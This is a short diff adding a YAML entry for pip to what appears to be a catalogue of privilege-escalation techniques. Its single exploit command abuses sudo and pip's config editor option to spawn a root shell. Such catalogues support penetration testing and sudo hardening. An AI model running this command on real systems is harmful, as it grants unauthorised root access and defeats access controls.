@@ -1,0 +1,4 @@
+name: pip
+binary_path: /usr/bin/pip
+exploit_cmds:
+- sudo /usr/bin/pip config --editor '/bin/sh -s' edit
